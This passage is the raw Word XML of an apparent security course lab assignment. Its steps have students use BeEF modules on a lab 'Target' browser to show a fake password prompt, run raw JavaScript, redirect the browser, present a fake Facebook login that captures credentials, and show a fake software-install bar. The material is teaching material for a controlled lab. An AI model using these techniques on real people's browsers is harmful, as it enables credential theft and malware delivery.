    <w:p w14:paraId="7F8C70BE" w14:textId="77777777" w:rsidR="00AA548F" w:rsidRPr="00AA548F" w:rsidRDefault="00AA548F" w:rsidP="00AA548F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AA548F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Insert a screenshot:</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="-759374585"/>
        <w:placeholder>
          <w:docPart w:val="BFA8C42004A940BD89C1AE92F337DDCB"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="49CE3417" w14:textId="77777777" w:rsidR="00AA548F" w:rsidRPr="00AA548F" w:rsidRDefault="00AA548F" w:rsidP="00AA548F">
          <w:pPr>
            <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
            <w:rPr>
              <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
              <w:sz w:val="24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EFEE07B" w14:textId="7F8F5AEB" w:rsidR="00791CC7" w:rsidRPr="009377F9" w:rsidRDefault="009377F9" w:rsidP="00373BAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r w:rsidRPr="0024680D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>BeEf</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005218F9" w:rsidRPr="005218F9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Browser</w:t>
      </w:r>
      <w:r w:rsidR="005218F9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005218F9">
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidR="005218F9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00EA0A91">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Create Prompt Dialog</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Type in </w:t>
      </w:r>
      <w:r w:rsidRPr="009377F9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Please Enter Your Password:</w:t>
      </w:r>
      <w:r w:rsidRPr="009377F9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009377F9">
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidRPr="009377F9">
        <w:t xml:space="preserve"> Click</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Execute.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4250F0E0" w14:textId="7870AE47" w:rsidR="009377F9" w:rsidRDefault="009377F9" w:rsidP="009377F9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>There will be a</w:t>
      </w:r>
      <w:r w:rsidR="00912642">
        <w:t xml:space="preserve"> logon</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> prompt on the Target machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF6602C" w14:textId="77777777" w:rsidR="00EE0859" w:rsidRPr="00AA548F" w:rsidRDefault="00EE0859" w:rsidP="00EE0859">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AA548F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Insert a screenshot:</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="1390536628"/>
        <w:placeholder>
          <w:docPart w:val="74BCA74309EB4A919C62E92F0CD99336"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="15DAC671" w14:textId="02D43BF3" w:rsidR="00EE0859" w:rsidRDefault="00EE0859" w:rsidP="00EE0859"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2BC6D5A4" w14:textId="1F368721" w:rsidR="003A778F" w:rsidRDefault="00A231D7" w:rsidP="009377F9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r w:rsidRPr="00A231D7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>BeEf</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00A231D7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Misc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00A231D7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Raw JavaScript</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00A231D7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Execute</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09EAB1D1" w14:textId="2C827700" w:rsidR="00A231D7" w:rsidRDefault="00A231D7" w:rsidP="009377F9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The Javascript will execute in the Target Browser</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DFD65F" w14:textId="77777777" w:rsidR="00EE0859" w:rsidRPr="00AA548F" w:rsidRDefault="00EE0859" w:rsidP="00EE0859">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AA548F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Insert a screenshot:</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="767657914"/>
        <w:placeholder>
          <w:docPart w:val="B62BBBB971D14AFE8965FBFB44CFA1AF"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="241C0974" w14:textId="172FC166" w:rsidR="00EE0859" w:rsidRDefault="00EE0859" w:rsidP="00EE0859"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689F44B7" w14:textId="24F58BA8" w:rsidR="00A231D7" w:rsidRDefault="00A231D7" w:rsidP="009377F9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r w:rsidRPr="00D822A0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>BeEf</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D822A0">
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidR="00D822A0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D822A0" w:rsidRPr="00D822A0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Browser</w:t>
      </w:r>
      <w:r w:rsidR="00D822A0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D822A0">
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidR="00D822A0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D822A0" w:rsidRPr="00D822A0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Redirect Browser</w:t>
      </w:r>
      <w:r w:rsidR="00D822A0" w:rsidRPr="00F34931">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F34931" w:rsidRPr="00F34931">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>(Rick Roll)</w:t>
      </w:r>
      <w:r w:rsidR="00D822A0">
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidR="00D822A0">
        <w:t xml:space="preserve"> Click </w:t>
      </w:r>
      <w:r w:rsidR="00D822A0" w:rsidRPr="00D822A0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Execute</w:t>
      </w:r>
      <w:r w:rsidR="00D822A0">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B9C03EA" w14:textId="162C4493" w:rsidR="00D822A0" w:rsidRDefault="00D822A0" w:rsidP="009377F9">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The Target browser wi</w:t>
      </w:r>
      <w:r w:rsidR="00F34931">
        <w:t>ll show video unavailable. Click Watch on YouTube</w:t>
      </w:r>
      <w:r w:rsidR="00EE0859">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2AFBB7" w14:textId="77777777" w:rsidR="00EE0859" w:rsidRPr="00AA548F" w:rsidRDefault="00EE0859" w:rsidP="00EE0859">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AA548F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Insert a screenshot:</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="34856662"/>
        <w:placeholder>
          <w:docPart w:val="65D69C1F62FB4618823D41D1E26643F0"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="5E8DBEFC" w14:textId="7BEF8FBB" w:rsidR="00D822A0" w:rsidRDefault="00EE0859" w:rsidP="00EE0859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570CD97" w14:textId="180D073C" w:rsidR="00014869" w:rsidRDefault="00014869" w:rsidP="00AB0B1E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r w:rsidRPr="00D822A0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>BeEf</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AB0B1E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Social Engineering</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AB0B1E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Pretty Theft</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00D822A0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Execute</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="306A0041" w14:textId="6A1A2B17" w:rsidR="00014869" w:rsidRDefault="00014869" w:rsidP="00AB0B1E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The Target browser </w:t>
      </w:r>
      <w:r w:rsidR="000E5789">
        <w:t>will</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> show a fake Facebook Login.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4BABA1" w14:textId="77777777" w:rsidR="00F02BE1" w:rsidRPr="00AA548F" w:rsidRDefault="00F02BE1" w:rsidP="00F02BE1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AA548F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Insert a screenshot:</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="-1477140670"/>
        <w:placeholder>
          <w:docPart w:val="FD624295EE1346A79EEC54010ACCB53F"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="7104077E" w14:textId="77777777" w:rsidR="00F02BE1" w:rsidRDefault="00F02BE1" w:rsidP="00F02BE1">
          <w:pPr>
            <w:ind w:left="360"/>
          </w:pPr>
          <w:r w:rsidRPr="00AB0B1E">
            <w:rPr>
              <w:rStyle w:val="PlaceholderText"/>
              <w:color w:val="FF0000"/>
            </w:rPr>
            <w:t>Click or tap here to enter text.</w:t>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="2D2C3E66" w14:textId="1DA9A8F8" w:rsidR="00F02BE1" w:rsidRDefault="00F02BE1" w:rsidP="00AB0B1E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Type in a fake username and password.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F92CE84" w14:textId="05D6B7E0" w:rsidR="00AB0B1E" w:rsidRPr="00AA548F" w:rsidRDefault="0050029F" w:rsidP="00AB0B1E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>From</w:t>
      </w:r>
      <w:r w:rsidR="00F02BE1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> Be</w:t>
      </w:r>
      <w:r w:rsidR="00E83527">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r w:rsidR="00983783">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r w:rsidR="000E57C6">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000E57C6" w:rsidRPr="000E57C6">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidR="00F02BE1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AB0B1E" w:rsidRPr="00AA548F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Insert a screenshot</w:t>
      </w:r>
      <w:r w:rsidR="00F02BE1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> of the capture</w:t>
      </w:r>
      <w:r w:rsidR="004A1B5C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="00F02BE1">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> username and password:</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="1253855574"/>
        <w:placeholder>
          <w:docPart w:val="C84F304B18224A539B33663F7EB2FD9D"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="76C60296" w14:textId="1783703E" w:rsidR="00AB0B1E" w:rsidRDefault="00AB0B1E" w:rsidP="00AB0B1E">
          <w:pPr>
            <w:ind w:left="360"/>
            <w:rPr>
              <w:rStyle w:val="Red"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="00AB0B1E">
            <w:rPr>
              <w:rStyle w:val="PlaceholderText"/>
              <w:color w:val="FF0000"/>
            </w:rPr>
            <w:t>Click or tap here to enter text.</w:t>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="2875C408" w14:textId="01CB34D3" w:rsidR="00EC76D5" w:rsidRDefault="00EC76D5" w:rsidP="00EC76D5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r w:rsidRPr="00EC76D5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>BeEF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00EC76D5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Social Engineering</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00EC76D5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Fake Notification Bar (IE)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00EC76D5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Execute</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB63587" w14:textId="02CA14C0" w:rsidR="00EC76D5" w:rsidRDefault="00EC76D5" w:rsidP="00EC76D5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>The Targe</w:t>
      </w:r>
      <w:r w:rsidR="001F6B2A">
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> browser should show a fake notification bar wanting to install software.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DD566D" w14:textId="77777777" w:rsidR="00EC76D5" w:rsidRPr="00AA548F" w:rsidRDefault="00EC76D5" w:rsidP="00EC76D5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AA548F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Insert a screenshot:</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="-473601237"/>
        <w:placeholder>
          <w:docPart w:val="65C7F7C8C14D4131AB26DBEB54E75D4F"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="04497FA6" w14:textId="77777777" w:rsidR="00EC76D5" w:rsidRDefault="00EC76D5" w:rsidP="00EC76D5">
          <w:pPr>
            <w:ind w:left="360"/>
          </w:pPr>
          <w:r w:rsidRPr="00AB0B1E">
            <w:rPr>
              <w:rStyle w:val="PlaceholderText"/>
              <w:color w:val="FF0000"/>
            </w:rPr>
            <w:t>Click or tap here to enter text.</w:t>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="21769AE7" w14:textId="4973EF8D" w:rsidR="00B607CB" w:rsidRPr="001C1D10" w:rsidRDefault="005C6102" w:rsidP="00CA020E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc191729609"/>
      <w:r w:rsidRPr="001C1D10">
        <w:t>Assignment Submission</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="5CE3D4EE" w14:textId="463FCDF0" w:rsidR="003F4CB5" w:rsidRPr="003F4CB5" w:rsidRDefault="00AD3AA3" w:rsidP="00AD3AA3">
      <w:r>
        <w:t xml:space="preserve">Attach all program files </w:t>
      </w:r>
      <w:r w:rsidR="0097306B">
        <w:t xml:space="preserve">and a screenshot of your username and password </w:t>
      </w:r>
      <w:r w:rsidR="00AA18B2">
        <w:t>as shown above</w:t>
      </w:r>
      <w:r w:rsidR="004B20DF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>to the assignment in BlackBoard.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="003F4CB5" w:rsidRPr="003F4CB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396E1" w14:textId="77777777" w:rsidR="00A175B0" w:rsidRDefault="00A175B0" w:rsidP="00A175B0">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="7A1D5614" w14:textId="77777777" w:rsidR="00A175B0" w:rsidRDefault="00A175B0" w:rsidP="00A175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19780" w14:textId="7939401A" w:rsidR="00A175B0" w:rsidRDefault="00C610F5" w:rsidP="00A175B0">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:tabs>
        <w:tab w:val="right" w:pos="10080"/>
      </w:tabs>
    </w:pPr>
    <w:r>
      <w:t>BeEF</w:t>
    </w:r>
    <w:r w:rsidR="00A175B0">
      <w:tab/>
      <w:t xml:space="preserve">Page </w:t>
    </w:r>
    <w:r w:rsidR="00A175B0">
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r w:rsidR="00A175B0">
      <w:instrText xml:space="preserve"> PAGE </w:instrText>
    </w:r>
    <w:r w:rsidR="00A175B0">
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="00A175B0">
      <w:t>11</w:t>
    </w:r>
    <w:r w:rsidR="00A175B0">
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r w:rsidR="00A175B0">
      <w:t xml:space="preserve"> of </w:t>
    </w:r>
    <w:fldSimple w:instr=" NUMPAGES ">
      <w:r w:rsidR="00A175B0">
        <w:t>14</w:t>
      </w:r>
    </w:fldSimple>
    <w:r w:rsidR="00A175B0">
      <w:tab/>
      <w:t xml:space="preserve">Revised: </w:t>
    </w:r>
    <w:r w:rsidR="000B0C9A">
      <w:t>0</w:t>
    </w:r>
    <w:r w:rsidR="00445284">
      <w:t>3</w:t>
    </w:r>
    <w:r w:rsidR="000B0C9A">
      <w:t>/</w:t>
    </w:r>
    <w:r w:rsidR="00445284">
      <w:t>01</w:t>
    </w:r>
    <w:r w:rsidR="000B0C9A">
      <w:t>/24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AA687" w14:textId="77777777" w:rsidR="00A175B0" w:rsidRDefault="00A175B0" w:rsidP="00A175B0">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="40927B80" w14:textId="77777777" w:rsidR="00A175B0" w:rsidRDefault="00A175B0" w:rsidP="00A175B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A103359"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="047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A0C1034"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B478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38B6927"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2CAC2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D5E1F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="4F18B2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D97123B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="49328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D1AF5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A6324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AC2247E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FEE6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59015316">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="682513149">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1070276221">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="335230670">
    <w:abstractNumId w:val="42"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1681852858">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="204104860">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1951355547">
    <w:abstractNumId w:val="47"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="975988262">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="242640961">
    <w:abstractNumId w:val="41"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="5641639">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="2062091537">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="749929784">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="1237932087">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="102386788">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="1187672470">
